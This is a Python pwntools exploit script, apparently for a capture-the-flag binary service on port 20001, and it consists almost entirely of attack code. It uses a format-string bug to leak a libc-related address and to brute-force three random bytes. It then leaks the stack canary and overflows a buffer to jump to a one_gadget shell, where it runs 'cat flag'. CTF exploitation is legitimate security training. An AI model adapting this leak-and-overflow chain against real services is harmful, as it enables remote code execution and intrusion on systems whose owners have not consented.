from pwn import *
import sys
# context.log_level = "debug"
base = 0x0000555555554000
p = remote(sys.argv[1],20001)
# gdb.attach(p, "b *%d\nb *%d\nc" % (base + 0x15F8, base + 0x10df))
# gdb.attach(p, "b *%d\nc" % (base + 0x000000000000132F))
# gdb.attach(p, "c" )

p.sendlineafter("3.", "1")
p.sendlineafter("rite?", "2")

p.sendlineafter("2.gou", "2")
p.sendafter("position", r"%x%x%x%lx%x")
p.recvn(7)
libc = int(p.recvuntil(" ", drop = True), 16)
log.success("libc " + hex(libc))

p.sendlineafter("2.gou", "2")


re = ""
prev_t = None
while len(re) != 3:
    for a in xrange(256):
        if chr(a) == "*" or chr(a) == "n" or chr(a) == "$" or chr(a) == "%":
            continue
        payload = re + chr(a)
        payload += "%x%x,%x"
        if len(payload) < 10:
            payload += "\n"
        p.sendlineafter("2.gou", "2")
        p.sendafter("position:\n", payload)
        
        t = p.recvuntil(" has", drop = True)
        if len(t) > 0:
            # print t.split(",")
            # print payload
            # raw_input()
            try:
                t = int(t.split(",")[-1].strip(), 16)
            except Exception as e:
                continue
            if t != ord(payload[len(re)]):
                re += chr(a)
                log.success("brute byte : " + hex(a))
                break
log.success("random : " + re.encode('hex'))
# context.log_level = "debug"

p.sendlineafter("2.gou", "2")
p.sendafter("position:\n", re + "\x00\n")
p.sendlineafter("2.gou", "1")

# To leak canary
offset_to_tls = 0x5ed700 # need test remote maybe
libc_base = libc - offset_to_tls
magic = libc_base + 0x4526a
p.sendlineafter("en:", str(libc + 0x28 + 1))
p.recvuntil("The ")
canary = "\x00" + p.recvuntil(" chi", drop = True)
canary = canary[:8]
log.success("canary : " + canary.encode('hex'))


# To leak offset to libc
#print "To leak " + hex(libc + 0x901)
#p.sendlineafter("en:", str(libc + 0x901))
#p.recvuntil("The ")
#libc_base = u64("\x00" + p.recvuntil(" chi", drop = True).ljust(7, "\x00"))
#print "libc base " + hex(libc_base)
#print "Offset to tls : " + hex(libc - libc_base)


payload = "a"*40 + canary + p64(0)
payload += p64(magic) + p64(0) * 8
p.sendlineafter("enjoy it~", payload)

p.send("cat flag;echo haozigege\n")
print p.recvuntil('haozi')
